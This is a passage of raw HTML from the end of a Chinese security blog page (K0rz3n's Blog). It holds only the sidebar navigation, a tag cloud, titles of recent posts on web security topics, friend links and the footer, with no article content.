+</div><div class="tags"><a href="/tags/PHP/">PHP</a></div><div class="post-nav"><a class="pre" href="/2019/02/12/PHPINFO 中的重要信息/">PHPINFO 中的重要信息</a><a class="next" href="/2019/02/10/PHP 中的转义函数小结/">PHP 中的转义函数小结</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/08/无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)/">无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/论白名单的不安全性与内容安全政策的未来(半翻译有删增)/">论白名单的不安全性与内容安全策略的未来(半机翻有删增)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/JSONP 劫持原理与挖掘方法/">JSONP 劫持原理与挖掘方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/爬虫爬取动态网页的三种方式简介/">爬虫爬取动态网页的三种方式简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/04/《白帽子讲 web 扫描》 阅读记录(下)/">《白帽子讲 web 扫描》 阅读记录(下)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/《白帽子讲 web 扫描》 阅读记录(上)/">《白帽子讲 web 扫描》 阅读记录(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/02/面向源代码的软件漏洞静态检测综述/">面向源代码的软件漏洞静态检测综述</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
